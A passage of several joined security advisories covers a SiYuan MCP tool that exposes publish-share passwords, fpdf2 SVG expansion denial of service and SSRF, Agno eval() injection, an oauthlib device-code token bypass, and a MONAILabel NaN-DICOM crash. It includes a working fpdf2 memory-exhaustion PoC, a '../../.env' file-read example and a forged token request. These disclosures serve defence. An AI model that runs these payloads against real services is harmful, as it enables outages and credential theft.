recommended restricting this tool's scope. In practice, the MCP tool implements only 1 of the
4 static blocklist entries the HTTP API enforces.

## Comparison

`kernel/api/file.go` `refuseToAccess()` blocks:
1. `conf/conf.json` (API token, cookie signing key, accessAuthCode)
2. `data/snippets/conf.json`
3. the entire `data/templates` directory
4. `data/.siyuan/publishAccess.json`
5. (dynamic, per-request) any path the current publish-mode session isn't authorized for

`kernel/mcp/tools/file.go` `resolvePath()` blocks only:
```go
confPath := filepath.Join(util.ConfDir, "conf.json")
if abs == confPath {
    return "", fmt.Errorf("access to conf.json is forbidden")
}
```
Items 2, 3, and 4 are absent. The tool's own `list`/`read`/`grep`/`find` actions remain fully
functional against them.

## Impact

An MCP client with access to the `file` tool (post-fix for GHSA-cvhv-7xhj-xjp8, i.e. a properly
authenticated Administrator-level caller) can read `data/.siyuan/publishAccess.json` directly:

```go
type PublishAccessItem struct {
    ID       string `json:"id"`
    Visible  bool   `json:"visible"`
    Password string `json:"password"` // plaintext; empty string = no password
    Disable  bool   `json:"disable"`
}
```

This exposes the plaintext access password for every publish-mode-shared notebook/document,
letting the reader bypass password protection on any publish-mode share. This is a serious
sibling issue given the volume of publish-mode access-control bugs already reported against this
codebase — the passwords protecting exactly that feature are directly readable through a tool
whose own description says "never use for workspace data."

`data/templates` and `data/snippets/conf.json` are lower-severity but still inconsistent with
the HTTP API's own precedent for what counts as sensitive.

## Why this is a distinct finding, not a duplicate

GHSA-cvhv-7xhj-xjp8 was about *reachability* an unauthenticated Reader-tier JWT being forwarded
to admin-scoped paths including `/mcp`. That has been fixed. This report is about the *tool's own
scope* once reached by a legitimate, properly-authenticated caller, the remediation notes for
that same advisory explicitly called for restricting `resolvePath` to
`WorkspaceDir/temp/siyuan/*.log`, which was not implemented; instead the tool retains
workspace-wide scope with only a single-file blocklist addition.

## Suggested fix

Either replicate the full `refuseToAccess()` blocklist in `resolvePath()` (minimum fix, keeps
parity with the HTTP API going forward by extracting `refuseToAccess`'s path list into a shared
helper both call), or implement the originally-recommended allowlist restricting the tool to
`WorkspaceDir/temp/siyuan/*.log` for read and disabling write/delete/rename/copy entirely unless
the caller is Administrator, matching the tool's own advertised "debugging/log reading only"
scope.

### Summary

fpdf2 expands SVG `<use>` references by deep-copying the complete referenced graphics tree. A small SVG can use nested references to make the number of in-memory objects grow exponentially, causing excessive CPU and memory consumption during `FPDF.image()` processing.

This was reproduced with an 895-byte SVG on fpdf2 2.8.7. Under a 128 MB process limit, the input kept the process busy for about 14 seconds before raising `MemoryError`. 

### Details

The issue is in fpdf2's own SVG reference handling. It does not rely on XML entities, external URLs, local files, or vulnerable behavior in another dependency.

When fpdf2 resolves an SVG reference, [`SVGObject.build_xref()`](https://github.com/py-pdf/fpdf2/blob/a3307f96a0d165831029b3fb644aee5a7ca03328/fpdf/svg.py#L1584) passes the referenced object to `GraphicsContext.add_item()`:

```python
pdf_group.add_item(self.cross_references[ref])
```

[`GraphicsContext.add_item()`](https://github.com/py-pdf/fpdf2/blob/a3307f96a0d165831029b3fb644aee5a7ca03328/fpdf/drawing.py#L3618-L3633) uses `clone=True` by default and deep-copies the object:

```python
def add_item(self, item, clone=True):
    if clone:
        item = deepcopy(item)
    self.path_items.append(item)
```

An attacker can define `g1` as eight references to `g0`, `g2` as eight references to `g1`, and so on. Each level adds only a small amount of XML, but fpdf2 copies the entire tree from the previous level eight times. The resulting work grows approximately as `8^n`.

`ResourceAccessPolicy` does not prevent this behavior because the SVG contains only inline objects and does not request any external resource. The same failure was reproduced on development commit `a3307f96a0d165831029b3fb644aee5a7ca03328` with `ResourceAccessPolicy.NONE`.

### PoC

This was tested on Linux with Python 3.13.5. The script applies a 128 MB address-space limit so the process fails safely instead of consuming all available system memory.

```python
import resource
import time

from fpdf import FPDF

groups = ['<g id="g0"><rect width="1" height="1"/></g>']
for level in range(1, 6):
    uses = f'<use href="#g{level - 1}"/>' * 8
    groups.append(f'<g id="g{level}">{uses}</g>')

svg = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
    '<defs>' + "".join(groups) + '</defs><use href="#g5"/></svg>'
).encode()

pdf = FPDF()
pdf.add_page()

limit = 128 * 1024 * 1024
resource.setrlimit(resource.RLIMIT_AS, (limit, limit))

print(f"payload size: {len(svg)} bytes")
started = time.perf_counter()

try:
    pdf.image(svg, w=10)
except MemoryError:
    elapsed = time.perf_counter() - started
    max_rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    print(f"MemoryError after {elapsed:.3f}s, max RSS: {max_rss} KiB")
```

```text
payload size: 895 bytes
MemoryError after 14.336s, max RSS: 115596 KiB
```

Execution time varies by machine, but the process should show heavy resource use and fail at the configured memory limit.

### Impact

This is an uncontrolled resource consumption vulnerability affecting applications that pass user-controlled SVG data to `FPDF.image()`. A single crafted image can occupy a PDF generation worker for several seconds and then make the current job fail with `MemoryError`. Submitting the same input concurrently repeats the CPU and memory cost across the available workers, reducing or exhausting the service's PDF generation capacity.

The payload is less than 1 KB and requires no external resource access, XML entities, special network configuration, or permissive fpdf2 settings.

## Summary `fpdf2` implicitly dereferences image resource references supplied to rendering APIs. If an application passes untrusted HTML, SVG, template data, or image paths into those APIs, `fpdf2` may issue outbound HTTP(S) requests or attempt to open local filesystem paths. This behavior is relevant in applications that render untrusted or user-provided input without sanitizing or restricting embedded resource references. ## Description In affected versions, `fpdf2` uses a shared internal image-loading mechanism for multiple features. This loader: * fetches `http://` and `https://` URLs over the network * opens other string values as local filesystem paths During document processing, resource references embedded in input content are automatically dereferenced using this mechanism. This behavior is reachable through: * `FPDF.image()` * `FPDF.write_html()` via HTML `` * `FPDF.image()` when rendering SVG files containing `` or `xlink:href="...">` * template image elements that forward values into `FPDF.image()` If an application renders attacker-controlled input through these APIs, that input can cause: * outbound HTTP(S) requests to attacker-chosen destinations * local file open attempts for attacker-chosen paths This may enable Server-Side Request Forgery (SSRF) in applications that render untrusted content. Local file access impact is limited: the library attempts to open the referenced path, but successful embedding depends on the target being a valid and supported image or SVG resource. `file://` URLs are not specially handled; raw filesystem paths such as `/path/to/file` or `../../file.png` are the relevant local-path cases. ## Impact This issue affects applications that render untrusted or partially trusted content using `fpdf2`. Applications may be impacted if they: * pass untrusted HTML into `write_html()` * render untrusted SVG with embedded `` references * pass user-controlled strings into `image()` * allow untrusted template definitions or template field values to control image paths Potential impacts include: * outbound requests to internal or external network services * limited local file access attempts depending on file type and parsing success (limited to content that fpdf2 recognizes as a supported image or SVG resource) The severity depends on how `fpdf2` is integrated and whether untrusted input is allowed to control resource references. **Example scenarios** HTML: ```python pdf.write_html('') ``` SVG: ```xml ``` Direct image path: ```python pdf.image("../../.env") ``` **Workarounds** Applications can mitigate this by: - not rendering untrusted HTML, SVG, or template content - rejecting user-controlled `src` / `href` / image-path values - mapping resources through an application-defined allowlist - converting user-supplied images to trusted in-memory objects before passing them to `fpdf2` **Credits** - @kule500 for identifying SSRF via HTML handling - @BudongJW for identifying SVG resource loading as an additional vector - @redyank for analysis of the shared image loading mechanism - @manop55555 for identifying a DNS rebinding bypass in the initial REMOTE_PUBLIC implementation

### Impact
Agno versions prior to 2.3.24 contain an arbitrary code execution vulnerability
in the model execution component. The `field_type` parameter on a `FunctionCall`
input field was passed to Python's built-in `eval()`, allowing an attacker who
could influence that value to execute arbitrary Python code in the Agno process.

This is a code injection flaw (CWE-95) with full impact to confidentiality,
integrity, and availability. CVSS 3.1 score: 9.3 (Critical).

Any deployment that exposes Agno to user-influenced FunctionCall inputs
(for example via an API, web UI, or untrusted tool/model output) is affected.

### Patches
Fixed in **Agno 2.3.24**.

The unsafe `eval()` call was replaced with a fixed `type_mapping` dictionary
lookup, and `field_type` is now validated as either a known string key or an
already-resolved `type` object before use. See commit
[cbf67552](https://github.com/agno-agi/agno/commit/cbf675521d4d2281925a051784a3b94172e56416)
(PR #5912).

All users should upgrade to 2.3.24 or later. The current release line (2.6.x)
includes the fix.

### Workarounds
There is no safe workaround. Users who cannot upgrade should ensure no
untrusted input can reach the `field_type` parameter of `FunctionCall`
input fields, but upgrading is strongly preferred.

### References
- Patch commit: https://github.com/agno-agi/agno/commit/cbf675521d4d2281925a051784a3b94172e56416
- Patch PR: https://github.com/agno-agi/agno/pull/5912
- CWE-95: https://cwe.mitre.org/data/definitions/95.html

### Summary
A call to the token endpoint with a grant type of `"urn:ietf:params:oauth:grant-type:device_code"` and a bogus `device_code` is able to get a bearer token as long as they know a valid client ID enabled for the device workflow.

### Details

[Section 3.4 of the RFC 8628 spec](https://datatracker.ietf.org/doc/html/rfc8628#section-3.4) says that the token endpoint should take in `device_code` as a required parameter.`DeviceCodeGrant.validate_token_request` does not perform any validation of `device_code`. `DeviceCodeGrant.validate_token_request` should be validating that `device_code` was passed in as a parameter and that it is valid, similar to how `AuthorizationCodeGrant.validate_token_request` does the checks [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L446) and [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L483).

I would like to propose a new method be added to `RequestValidator` called `validate_device_code` that is similar to the `validate_code` method and is called inside of `DeviceCodeGrant.validate_token_request`.

### PoC
Create an implementation of `RequestValidation.authenticate_client` that returns `True` if the client's `client_type` is `"public"`. You would find yourself in this scenario because there's another issue with `DeviceCodeGrant.validate_token_request` where it doesn't properly handle public clients (see https://github.com/oauthlib/oauthlib/issues/919).

Create a client that has a `client_type` of `"public"` and set it's `grant_type` to `"urn:ietf:params:oauth:grant-type:device_code"`.

With this implementation of `RequestValidation.authenticate_client` done, use that validator for your token endpoint. Call the token endpoint with a body of 
```
{
  "client_id": <ID of the public client you made>,
  "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
  "device_code": <anything you want since it's not validated>
}
```

You now have a bearer token for the client without a valid `device_code`.

### Impact
Anyone using the RFC 8628 device workflow in oauthlib that doesn't realize the `device_code` parameter is not being validated.

### Summary

An unauthenticated remote attacker can crash a running MONAILabel server or silently corrupt its medical AI inference results by uploading a single crafted DICOM file (~132 KB) via the REST API. The vulnerability stems from pydicom's lack of validation for Decimal String (DS) and Integer String (IS) DICOM Value Representations, which allows NaN and infinity values to pass through MONAI's PydicomReader and propagate through the entire spatial transform and ML inference pipeline.

No authentication is required for the default MONAILabel REST API. The attacker needs only network access to the server (default port 8000).

**Severity:** CVSS 3.1: 8.7 HIGH  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:L  
**CWE:** CWE-20 (Improper Input Validation) → CWE-682 (Incorrect Calculation)

### Details

**Root Cause — Layer 1: pydicom accepts invalid VR values**

pydicom's `DSfloat.__new__()` calls Python's `float(val)`, which silently accepts "NaN", "inf", and "-inf". The DICOM standard (PS3.5 Table 6.2-1) defines DS as digits 0-9, +, -, ., e only. NaN and inf are not valid DS values. The `is_valid_ds()` check only runs in RAISE validation mode, which is NOT the default. The default mode is WARN, which still returns the invalid value.

```python
>>> from pydicom.valuerep import DSfloat
>>> DSfloat("NaN")
nan    # Accepted silently — should be rejected
>>> DSfloat("inf")
inf    # Accepted silently — should be rejected
```

This affects ALL pydicom versions from 0.9.7 through 3.0.2 (current).

A related bypass exists in pydicom's IS type: `IS("1e4")` returns 10000 via an `int(float(val))` fallback, accepting scientific notation that is not valid per the DICOM standard.

**Root Cause — Layer 2: MONAI Core trusts pydicom output without validation**

MONAI's `PydicomReader._get_affine()` builds a 4x4 affine transformation matrix from PixelSpacing, ImagePositionPatient, and ImageOrientationPatient with ZERO `isfinite()` or `isnan()` checks. NaN in PixelSpacing produces NaN in the affine diagonal, propagating through every spatial transform:
`PydicomReader._get_affine() → LoadImaged → Spacingd → Model → Writer`

**Root Cause — Layer 3: MONAILabel REST API accepts anything**

MONAILabel's `PUT /datastore/` endpoint accepts DICOM uploads with no authentication (default deployment), no validation of spatial metadata, and no bounds checking on any DICOM tag values. The malicious DICOM is stored permanently and made available for inference.

### PoC

**Environment Setup:**
```bash
# Start MONAILabel (Docker)
docker pull projectmonai/monailabel:latest
docker run -d --name monailabel-poc -p 8000:8000 --memory=8g \
    projectmonai/monailabel:latest monailabel start_server \
    --app /opt/monai/sample-apps/radiology \
    --studies /opt/monai/datasets/Task09_Spleen/imagesTr \
    --conf models segmentation

# Verify server is running
curl http://localhost:8000/info/
```

**Step 1 — Establish baseline (legitimate data works):**
```bash
curl -X POST "http://localhost:8000/infer/segmentation?image=spleen_40" \
     -o baseline.nii.gz -w "HTTP %{http_code} - %{size_download} bytes"
# Result: HTTP 200, ~223,628 bytes valid segmentation mask
```

**Step 2 — Run the attack (NaN DICOM upload + inference):**
```bash
pip install pydicom numpy requests
python poc_monailabel_ds_bypass.py --server http://localhost:8000
```

The PoC script:
1. Confirms pydicom accepts NaN/inf in DS fields
2. 2. Creates three malicious DICOM files (~132 KB each) with NaN/inf in PixelSpacing and ImagePositionPatient
3. 3. Uploads each via `PUT /datastore/` (no auth required) — HTTP 200 accepted
4. 4. Triggers inference via `POST /infer/segmentation` — HTTP 500, server crash
**Demonstrated Results:**

| Payload | Upload | Inference | Result |
|---|---|---|---|
| Baseline (spleen_40) | N/A | HTTP 200 | Valid 223 KB segmentation |
| NaN PixelSpacing | HTTP 200 | HTTP 500 | RuntimeError crash (18.0s wasted compute) |
| NaN PixelSpacing + IPP | HTTP 200 | HTTP 500 | RuntimeError crash (16.7s wasted compute) |
| Inf PixelSpacing | HTTP 200 | HTTP 500 | RuntimeError crash (16.4s wasted compute) |

**Server crash traceback:**
```
monailabel/tasks/infer/basic_infer.py → self.writer(data)
monailabel/transform/writer.py → write_itk(...)
itk/ITKCommonBasePython.py → itkProcessObject_Update()
RuntimeError: itkGDCMImageIO.cxx:1226:
  ITK ERROR: GDCMImageIO: A Floating point buffer was passed
  but the stored pixel type was not specified.
```

Each request burns ~16 seconds of server compute (full ML inference pipeline) before crashing. The NaN DICOM persists in the datastore — any future inference on that image ID crashes the server again.

**Library-level confirmation:** 17/17 test vectors confirmed against MONAI 1.5.2 and pydicom 3.0.2, including actual MONAI `LoadImaged` and `Spacingd` transforms accepting NaN geometry without error.

### Impact

1. **Denial of Service:** A single ~132 KB DICOM upload crashes the MONAILabel inference pipeline. All active inference requests from legitimate users are aborted. Repeatable indefinitely with minimal bandwidth.
2. **Silent Data Corruption:** NaN values in spatial metadata propagate through the entire ML inference pipeline and produce geometrically incorrect segmentation masks. If the output writer does not crash, the result is returned with HTTP 200 and zero warnings.
3. **Persistent Datastore Poisoning:** The malicious DICOM is stored permanently via `PUT /datastore/`. Any future inference request on that image ID reproduces the crash or corruption, persisting across server restarts.
**Affected MONAI Ecosystem (9 repositories):**
- MONAI Core: PydicomReader, LoadImaged, Spacingd transforms
- - MONAILabel: REST API + DICOMweb datastore
- - MONAI Deploy App SDK: DICOMDataLoaderOperator
- - model-zoo, VISTA, GenerativeModels, tutorials, research-contributions
**Affected DICOM Tags (any DS VR):** PixelSpacing, ImagePositionPatient, SliceThickness, ImageOrientationPatient, RescaleSlope, WindowCenter/WindowWidth

**Recommended Fix:**
1. Add `math.isfinite()` validation in `PydicomReader._get_affine()` on all values from PixelSpacing, IPP, IOP. Raise ValueError for NaN/inf.
2. 2. Validate spatial metadata of uploaded DICOM in MONAILabel `PUT /datastore/`. Return HTTP 400 for invalid geometry.
3. 3. Validate spatial metadata is finite in `LoadImaged`/`Spacingd` before resampling.
4. 4. Coordinate with pydicom upstream to reject NaN/inf in DS fields in all validation modes.
**Upstream:** pydicom GHSA filed 2026-04-05.

**Author:** Paulino Calderon (paulino@calderonpale.com)
